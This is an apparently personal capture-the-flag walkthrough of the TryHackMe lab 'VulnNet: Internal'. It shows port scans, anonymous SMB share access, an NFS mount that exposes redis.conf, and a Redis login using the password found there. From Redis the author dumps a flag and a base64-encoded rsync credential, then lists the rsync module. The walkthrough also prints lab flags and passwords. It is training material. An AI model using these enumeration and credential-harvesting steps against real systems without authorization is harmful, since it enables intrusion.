---
VulnNet Entertainment learns from its mistakes, and now they have something new for you...
---

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/133abb8b1a8449912a2461b8bd7d8edd.png)

###  VulnNet: Internal

 Start Machine

VulnNet Entertainment is a company that learns from its mistakes. They quickly realized that they can't make a properly secured web application so they gave up on that idea. Instead, they decided to set up internal services for business purposes. As usual, you're tasked to perform a penetration test of their network and report your findings.  

-   Difficulty: Easy/Medium
-   Operating System: Linux

This machine was designed to be quite the opposite of the previous machines in this series and it focuses on internal services. It's supposed to show you how you can retrieve interesting information and use it to gain system access. Report your findings by submitting the correct flags.

Note: It _might_ take 3-5 minutes for all the services to boot.

Icon made by [Freepik](https://www.freepik.com/) from [www.flaticon.com](http://www.flaticon.com/)  

Answer the questions below

```
┌──(kali㉿kali)-[~/threader3000]
└─$ python threader3000.py                           
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.10.104.221
------------------------------------------------------------
Scanning target 10.10.104.221
Time started: 2022-12-29 12:04:55.771460
------------------------------------------------------------
Port 22 is open
Port 139 is open
Port 111 is open
Port 445 is open
Port 873 is open
Port 2049 is open
Port 6379 is open
Port 38607 is open
Port 50567 is open
Port 59263 is open
Port 59667 is open
Port scan completed in 0:01:19.809872
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,139,111,445,873,2049,6379,38607,50567,59263,59667 -sV -sC -T4 -Pn -oA 10.10.104.221 10.10.104.221
************************************************************
Would you like to run Nmap or quit to terminal?


┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.104.221 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.104.221:22
Open 10.10.104.221:111
Open 10.10.104.221:139
Open 10.10.104.221:445
Open 10.10.104.221:873
Open 10.10.104.221:2049
Open 10.10.104.221:6379
Open 10.10.104.221:38607
Open 10.10.104.221:50567
Open 10.10.104.221:59263
Open 10.10.104.221:59667
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-29 12:04 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Initiating Ping Scan at 12:04
Scanning 10.10.104.221 [2 ports]
Completed Ping Scan at 12:04, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:04
Completed Parallel DNS resolution of 1 host. at 12:04, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:04
Scanning 10.10.104.221 [11 ports]
Discovered open port 22/tcp on 10.10.104.221
Discovered open port 111/tcp on 10.10.104.221
Discovered open port 139/tcp on 10.10.104.221
Discovered open port 445/tcp on 10.10.104.221
Discovered open port 6379/tcp on 10.10.104.221
Discovered open port 2049/tcp on 10.10.104.221
Discovered open port 50567/tcp on 10.10.104.221
Discovered open port 59667/tcp on 10.10.104.221
Discovered open port 873/tcp on 10.10.104.221
Discovered open port 59263/tcp on 10.10.104.221
Discovered open port 38607/tcp on 10.10.104.221
Completed Connect Scan at 12:04, 0.42s elapsed (11 total ports)
Initiating Service scan at 12:04
Scanning 11 services on 10.10.104.221
Completed Service scan at 12:04, 16.86s elapsed (11 services on 1 host)
NSE: Script scanning 10.10.104.221.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 6.66s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.90s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Nmap scan report for 10.10.104.221
Host is up, received conn-refused (0.21s latency).
Scanned at 2022-12-29 12:04:17 EST for 25s

PORT      STATE SERVICE     REASON  VERSION
22/tcp    open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e278f48ae2ff889bb8913e39afd6340 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDagA3GVO7hKpJpO1Vr6+z3Y9xjoeihZFWXSrBG2MImbpPH6jk+1KyJwQpGmhMEGhGADM1LbmYf3goHku11Ttb0gbXaCt+mw1Ea+K0H00jA0ce2gBqev+PwZz0ysxCLUbYXCSv5Dd1XSa67ITSg7A6h+aRfkEVN2zrbM5xBQiQv6aBgyaAvEHqQ73nZbPdtwoIGkm7VL9DATomofcEykaXo3tmjF2vRTN614H0PpfZBteRpHoJI4uzjwXeGVOU/VZcl7EMBd/MRHdspvULJXiI476ID/ZoQLT2zQf5Q2vqI3ulMj5CB29ryxq58TVGSz/sFv1ZBPbfOl9OvuBM5BTBV
|   256 f4fe0be25c88b563138550ddd586abbd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNM0XfxK0hrF7d4C5DCyQGK3ml9U0y3Nhcvm6N9R+qv2iKW21CNEFjYf+ZEEi7lInOU9uP2A0HZG35kEVmuideE=
|   256 82ea4885f02a237e0ea9d9140a602fad (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJPRO3XCBfxEo0XhViW8m/V+IlTWehTvWOyMDOWNJj+i
111/tcp   open  rpcbind     syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      55828/udp6  mountd
|   100005  1,2,3      57177/udp   mountd
|   100005  1,2,3      57731/tcp6  mountd
|   100005  1,2,3      59667/tcp   mountd
|   100021  1,3,4      32787/udp6  nlockmgr
|   100021  1,3,4      36803/tcp6  nlockmgr
|   100021  1,3,4      37676/udp   nlockmgr
|   100021  1,3,4      38607/tcp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp   open  rsync       syn-ack (protocol version 31)
2049/tcp  open  nfs_acl     syn-ack 3 (RPC #100227)
6379/tcp  open  redis       syn-ack Redis key-value store
38607/tcp open  nlockmgr    syn-ack 1-4 (RPC #100021)
50567/tcp open  mountd      syn-ack 1-3 (RPC #100005)
59263/tcp open  mountd      syn-ack 1-3 (RPC #100005)
59667/tcp open  mountd      syn-ack 1-3 (RPC #100005)
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 16889/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 59621/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 50696/udp): CLEAN (Failed to receive data)
|   Check 4 (port 49763/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2022-12-29T18:04:35+01:00
|_clock-skew: mean: -20m00s, deviation: 34m37s, median: -1s
| smb2-time: 
|   date: 2022-12-29T17:04:35
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   VULNNET-INTERNA<00>  Flags: <unique><active>
|   VULNNET-INTERNA<03>  Flags: <unique><active>
|   VULNNET-INTERNA<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:04
Completed NSE at 12:04, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.18 seconds


┌──(kali㉿kali)-[~/threader3000]
└─$ smbclient -L 10.10.104.221
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            

or without a pass

┌──(kali㉿kali)-[~/threader3000]
└─$ smbclient -N -L 10.10.104.221

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        shares          Disk      VulnNet Business Shares
        IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            

getting files

┌──(kali㉿kali)-[~/threader3000]
└─$ smbclient -N \\\\10.10.104.221\\shares
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3278172 blocks available
smb: \> cd temp
smb: \temp\> dir
  .                                   D        0  Sat Feb  6 06:45:10 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  services.txt                        N       38  Sat Feb  6 06:45:09 2021

                11309648 blocks of size 1024. 3278172 blocks available
smb: \temp\> get services.txt 
getting file \temp\services.txt of size 38 as services.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \temp\> cd ..
smb: \> cd data
smb: \data\> ls
  .                                   D        0  Tue Feb  2 04:27:33 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  data.txt                            N       48  Tue Feb  2 04:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3277928 blocks available
smb: \data\> get data.txt 
getting file \data\data.txt of size 48 as data.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \data\> get business-req.txt 
getting file \data\business-req.txt of size 190 as business-req.txt (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \data\> cd ..
smb: \> ls
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3276872 blocks available
smb: \> cd ..
smb: \> ls
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

                11309648 blocks of size 1024. 3276872 blocks available

┌──(kali㉿kali)-[~/threader3000]
└─$ smbclient -N \\\\10.10.104.221\\print$
tree connect failed: NT_STATUS_ACCESS_DENIED
                                                                                                              
┌──(kali㉿kali)-[~/threader3000]
└─$ smbclient -N \\\\10.10.104.221\\IPC$  
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

┌──(kali㉿kali)-[~/threader3000]
└─$ ls
business-req.txt  data.txt  LICENSE  README.md  services.txt  threader3000.py
                                                                                                              
┌──(kali㉿kali)-[~/threader3000]
└─$ cat data.txt      
Purge regularly data that is not needed anymore
                                                                                                              
┌──(kali㉿kali)-[~/threader3000]
└─$ cat services.txt 
THM{0a09d51e488f5fa105d8d866a497440a}
                                                                                                              
┌──(kali㉿kali)-[~/threader3000]
└─$ cat business-req.txt 
We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.
                                                      

Network File System, o NFS, es un protocolo de nivel de aplicación, según el Modelo OSI. Es utilizado para sistemas de archivos distribuido en un entorno de red de computadoras de área local. Posibilita que distintos sistemas conectados a una misma red accedan a ficheros remotos como si se tratara de locales.

let's mount

┌──(kali㉿kali)-[~/threader3000]
└─$ mkdir tmp                         
                                                                                                              
┌──(kali㉿kali)-[~/threader3000]
└─$ ls
business-req.txt  data.txt  LICENSE  README.md  services.txt  threader3000.py  tmp
                                                                                                              
┌──(kali㉿kali)-[~/threader3000]
└─$ sudo mount -t nfs 10.10.104.221: tmp
[sudo] password for kali: 
                                                                                                              
┌──(kali㉿kali)-[~/threader3000]
└─$ tree tmp                
tmp
└── opt
    └── conf
        ├── hp
        │   └── hplip.conf
        ├── init
        │   ├── anacron.conf
        │   ├── lightdm.conf
        │   └── whoopsie.conf
        ├── opt
        ├── profile.d
        │   ├── bash_completion.sh
        │   ├── cedilla-portuguese.sh
        │   ├── input-method-config.sh
        │   └── vte-2.91.sh
        ├── redis
        │   └── redis.conf
        ├── vim
        │   ├── vimrc
        │   └── vimrc.tiny
        └── wildmidi
            └── wildmidi.cfg

9 directories, 12 files

┌──(kali㉿kali)-[~/threader3000]
└─$ redis-cli -h 10.10.104.221
10.10.104.221:6379> info
NOAUTH Authentication required.

need a pass

┌──(kali㉿kali)-[~/threader3000]
└─$ cd tmp/opt/conf/redis 
                                                                                                              
┌──(kali㉿kali)-[~/…/tmp/opt/conf/redis]
└─$ ls
redis.conf

┌──(kali㉿kali)-[~/…/tmp/opt/conf/redis]
└─$ more redis.conf | grep requirepass
# If the master is password protected (using the "requirepass" configuration
requirepass "B65Hx562F@ggAZ@F"
# requirepass foobared

redis pass B65Hx562F@ggAZ@F

┌──(kali㉿kali)-[~/…/tmp/opt/conf/redis]
└─$ redis-cli --help          
redis-cli 7.0.5

Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]]
  -h <hostname>      Server hostname (default: 127.0.0.1).
  -p <port>          Server port (default: 6379).
  -s <socket>        Server socket (overrides hostname and port).
  -a <password>      Password to use when connecting to the server.
                     You can also use the REDISCLI_AUTH environment
                     variable to pass this password more safely
                     (if both are used, this argument takes precedence).
  --user <username>  Used to send ACL style 'AUTH username pass'. Needs -a.
  --pass <password>  Alias of -a for consistency with the new --user option.

┌──(kali㉿kali)-[~/…/tmp/opt/conf/redis]
└─$ redis-cli -h 10.10.104.221 -a B65Hx562F@ggAZ@F
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.104.221:6379> info
# Server
redis_version:4.0.9
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:9435c3c2879311f3
redis_mode:standalone
os:Linux 4.15.0-135-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:7.4.0
process_id:546
run_id:0c4ec4ed01ac5b9407f52bfee9f9ee2d87790d02
tcp_port:6379
uptime_in_seconds:2214
uptime_in_days:0
hz:10
lru_clock:11391204
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_longest_output_list:0
client_biggest_input_buf:0
blocked_clients:0

# Memory
used_memory:841488
used_memory_human:821.77K
used_memory_rss:2887680
used_memory_rss_human:2.75M
used_memory_peak:841488
used_memory_peak_human:821.77K
used_memory_peak_perc:100.00%
used_memory_overhead:832358
used_memory_startup:782432
used_memory_dataset:9130
used_memory_dataset_perc:15.46%
total_system_memory:2087923712
total_system_memory_human:1.94G
used_memory_lua:37888
used_memory_lua_human:37.00K
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
mem_fragmentation_ratio:3.43
mem_allocator:jemalloc-3.6.0
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1672333374
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:10
total_commands_processed:3
instantaneous_ops_per_sec:0
total_net_input_bytes:355
total_net_output_bytes:10590
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:563c34f53fa965db4c43dc7c3b1f3817eda17381
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:2.50
used_cpu_user:1.55
used_cpu_sys_children:0.00
used_cpu_user_children:0.00

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=5,expires=0,avg_ttl=0

10.10.104.221:6379> ping
PONG
10.10.104.221:6379> KEYS *
1) "marketlist"
2) "internal flag"
3) "tmp"
4) "int"
5) "authlist"

10.10.104.221:6379> KEYS "internal flag"
1) "internal flag"
10.10.104.221:6379> GET "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"


10.10.104.221:6379> keys *
1) "marketlist"
2) "internal flag"
3) "tmp"
4) "int"
5) "authlist"
10.10.104.221:6379> get tmp
"temp dir..."
10.10.104.221:6379> get int
"10 20 30 40 50"
10.10.104.221:6379> get marketlist
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.10.104.221:6379> type marketlist
list
10.10.104.221:6379> lrange marketlist 1 100
1) "Penetration Testing"
2) "Programming"
3) "Data Analysis"
4) "Analytics"
5) "Marketing"
6) "Media Streaming"
10.10.104.221:6379> get authlist
(error) WRONGTYPE Operation against a key holding the wrong kind of value
10.10.104.221:6379> type authlist
list
10.10.104.221:6379> lrange authlist 1 100
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
10.10.104.221:6379> :)

┌──(kali㉿kali)-[~]
└─$ echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v

The encoded string revals the rsync connection string as well as the password

Rsync, que significa “sincronización remota”, **es una herramienta de sincronización de archivos remotos y locales**. Utiliza un algoritmo que minimiza la cantidad de datos copiados, moviendo solo las partes de los archivos que cambiaron.

let's see commands

┌──(kali㉿kali)-[~]
└─$ rsync --help                                          
rsync  version 3.2.6  protocol version 31
Copyright (C) 1996-2022 by Andrew Tridgell, Wayne Davison, and others.
Web site: https://rsync.samba.org/
Capabilities:
    64-bit files, 64-bit inums, 64-bit timestamps, 64-bit long ints,
    socketpairs, symlinks, symtimes, hardlinks, hardlink-specials,
    hardlink-symlinks, IPv6, atimes, batchfiles, inplace, append, ACLs,
    xattrs, optional secluded-args, iconv, prealloc, stop-at, no crtimes
Optimizations:
    SIMD-roll, no asm-roll, openssl-crypto, no asm-MD5
Checksum list:
    xxh128 xxh3 xxh64 (xxhash) md5 md4 none
Compress list:
    zstd lz4 zlibx zlib none

rsync comes with ABSOLUTELY NO WARRANTY.  This is free software, and you
are welcome to redistribute it under certain conditions.  See the GNU
General Public Licence for details.

rsync is a file transfer program capable of efficient remote update
via a fast differencing algorithm.

Usage: rsync [OPTION]... SRC [SRC]... DEST
  or   rsync [OPTION]... SRC [SRC]... [USER@]HOST:DEST
  or   rsync [OPTION]... SRC [SRC]... [USER@]HOST::DEST
  or   rsync [OPTION]... SRC [SRC]... rsync://[USER@]HOST[:PORT]/DEST
  or   rsync [OPTION]... [USER@]HOST:SRC [DEST]
  or   rsync [OPTION]... [USER@]HOST::SRC [DEST]
  or   rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST]
The ':' usages connect via remote shell, while '::' & 'rsync://' usages connect
to an rsync daemon, and require SRC or DEST to start with a module name.

Options
--verbose, -v            increase verbosity
--info=FLAGS             fine-grained informational verbosity
--debug=FLAGS            fine-grained debug verbosity
--stderr=e|a|c           change stderr output mode (default: errors)
--quiet, -q              suppress non-error messages
--no-motd                suppress daemon-mode MOTD
--checksum, -c           skip based on checksum, not mod-time & size
--archive, -a            archive mode is -rlptgoD (no -A,-X,-U,-N,-H)
--no-OPTION              turn off an implied OPTION (e.g. --no-D)
--recursive, -r          recurse into directories
--relative, -R           use relative path names
--no-implied-dirs        don't send implied dirs with --relative
--backup, -b             make backups (see --suffix & --backup-dir)
--backup-dir=DIR         make backups into hierarchy based in DIR
--suffix=SUFFIX          backup suffix (default ~ w/o --backup-dir)
--update, -u             skip files that are newer on the receiver
--inplace                update destination files in-place
--append                 append data onto shorter files
--append-verify          --append w/old data in file checksum
--dirs, -d               transfer directories without recursing
--old-dirs, --old-d      works like --dirs when talking to old rsync
--mkpath                 create the destination's path component
--links, -l              copy symlinks as symlinks
--copy-links, -L         transform symlink into referent file/dir
--copy-unsafe-links      only "unsafe" symlinks are transformed
--safe-links             ignore symlinks that point outside the tree
--munge-links            munge symlinks to make them safe & unusable
--copy-dirlinks, -k      transform symlink to dir into referent dir
--keep-dirlinks, -K      treat symlinked dir on receiver as dir
--hard-links, -H         preserve hard links
--perms, -p              preserve permissions
--executability, -E      preserve executability
--chmod=CHMOD            affect file and/or directory permissions
--acls, -A               preserve ACLs (implies --perms)
--xattrs, -X             preserve extended attributes
--owner, -o              preserve owner (super-user only)
--group, -g              preserve group
--devices                preserve device files (super-user only)
--copy-devices           copy device contents as a regular file
--write-devices          write to devices as files (implies --inplace)
--specials               preserve special files
-D                       same as --devices --specials
--times, -t              preserve modification times
--atimes, -U             preserve access (use) times
--open-noatime           avoid changing the atime on opened files
--crtimes, -N            preserve create times (newness)
--omit-dir-times, -O     omit directories from --times
--omit-link-times, -J    omit symlinks from --times
--super                  receiver attempts super-user activities
--fake-super             store/recover privileged attrs using xattrs
--sparse, -S             turn sequences of nulls into sparse blocks
--preallocate            allocate dest files before writing them
--dry-run, -n            perform a trial run with no changes made
--whole-file, -W         copy files whole (w/o delta-xfer algorithm)
--checksum-choice=STR    choose the checksum algorithm (aka --cc)
--one-file-system, -x    don't cross filesystem boundaries
--block-size=SIZE, -B    force a fixed checksum block-size
--rsh=COMMAND, -e        specify the remote shell to use
--rsync-path=PROGRAM     specify the rsync to run on remote machine
--existing               skip creating new files on receiver
--ignore-existing        skip updating files that exist on receiver
--remove-source-files    sender removes synchronized files (non-dir)
--del                    an alias for --delete-during
--delete                 delete extraneous files from dest dirs
--delete-before          receiver deletes before xfer, not during
--delete-during          receiver deletes during the transfer
--delete-delay           find deletions during, delete after
--delete-after           receiver deletes after transfer, not during
--delete-excluded        also delete excluded files from dest dirs
--ignore-missing-args    ignore missing source args without error
--delete-missing-args    delete missing source args from destination
--ignore-errors          delete even if there are I/O errors
--force                  force deletion of dirs even if not empty
--max-delete=NUM         don't delete more than NUM files
--max-size=SIZE          don't transfer any file larger than SIZE
--min-size=SIZE          don't transfer any file smaller than SIZE
--max-alloc=SIZE         change a limit relating to memory alloc
--partial                keep partially transferred files
--partial-dir=DIR        put a partially transferred file into DIR
--delay-updates          put all updated files into place at end
--prune-empty-dirs, -m   prune empty directory chains from file-list
--numeric-ids            don't map uid/gid values by user/group name
--usermap=STRING         custom username mapping
--groupmap=STRING        custom groupname mapping
--chown=USER:GROUP       simple username/groupname mapping
--timeout=SECONDS        set I/O timeout in seconds
--contimeout=SECONDS     set daemon connection timeout in seconds
--ignore-times, -I       don't skip files that match size and time
--size-only              skip files that match in size
--modify-window=NUM, -@  set the accuracy for mod-time comparisons
--temp-dir=DIR, -T       create temporary files in directory DIR
--fuzzy, -y              find similar file for basis if no dest file
--compare-dest=DIR       also compare destination files relative to DIR
--copy-dest=DIR          ... and include copies of unchanged files
--link-dest=DIR          hardlink to files in DIR when unchanged
--compress, -z           compress file data during the transfer
--compress-choice=STR    choose the compression algorithm (aka --zc)
--compress-level=NUM     explicitly set compression level (aka --zl)
--skip-compress=LIST     skip compressing files with suffix in LIST
--cvs-exclude, -C        auto-ignore files in the same way CVS does
--filter=RULE, -f        add a file-filtering RULE
-F                       same as --filter='dir-merge /.rsync-filter'
                         repeated: --filter='- .rsync-filter'
--exclude=PATTERN        exclude files matching PATTERN
--exclude-from=FILE      read exclude patterns from FILE
--include=PATTERN        don't exclude files matching PATTERN
--include-from=FILE      read include patterns from FILE
--files-from=FILE        read list of source-file names from FILE
--from0, -0              all *-from/filter files are delimited by 0s
--old-args               disable the modern arg-protection idiom
--secluded-args, -s      use the protocol to safely send the args
--trust-sender           trust the remote sender's file list
--copy-as=USER[:GROUP]   specify user & optional group for the copy
--address=ADDRESS        bind address for outgoing socket to daemon
--port=PORT              specify double-colon alternate port number
--sockopts=OPTIONS       specify custom TCP options
--blocking-io            use blocking I/O for the remote shell
--outbuf=N|L|B           set out buffering to None, Line, or Block
--stats                  give some file-transfer stats
--8-bit-output, -8       leave high-bit chars unescaped in output
--human-readable, -h     output numbers in a human-readable format
--progress               show progress during transfer
-P                       same as --partial --progress
--itemize-changes, -i    output a change-summary for all updates
--remote-option=OPT, -M  send OPTION to the remote side only
--out-format=FORMAT      output updates using the specified FORMAT
--log-file=FILE          log what we're doing to the specified FILE
--log-file-format=FMT    log updates using the specified FMT
--password-file=FILE     read daemon-access password from FILE
--early-input=FILE       use FILE for daemon's early exec input
--list-only              list the files instead of copying them
--bwlimit=RATE           limit socket I/O bandwidth
--stop-after=MINS        Stop rsync after MINS minutes have elapsed
--stop-at=y-m-dTh:m      Stop rsync at the specified point in time
--fsync                  fsync every written file
--write-batch=FILE       write a batched update to FILE
--only-write-batch=FILE  like --write-batch but w/o updating dest
--read-batch=FILE        read a batched update from FILE
--protocol=NUM           force an older protocol version to be used
--iconv=CONVERT_SPEC     request charset conversion of filenames
--checksum-seed=NUM      set block/file checksum seed (advanced)
--ipv4, -4               prefer IPv4
--ipv6, -6               prefer IPv6
--version, -V            print the version + other info and exit
--help, -h (*)           show this help (* -h is help only on its own)

Use "rsync --daemon --help" to see the daemon-mode command-line options.
Please see the rsync(1) and rsyncd.conf(5) manpages for full documentation.
See https://rsync.samba.org/ for updates, bug reports, and answers

┌──(kali㉿kali)-[~]
└─$ rsync --list-only rsync://10.10.104.221
files           Necessary home interaction

┌──(kali㉿kali)-[~]
└─$ rsync --list-only rsync://rsync-connect@10.10.104.221/files
Password: Hcg3HP67@TW@Bc72v
drwxr-xr-x          4,096 2021/02/01 07:51:14 .
drwxr-xr-x          4,096 2021/02/06 07:49:29 sys-internal


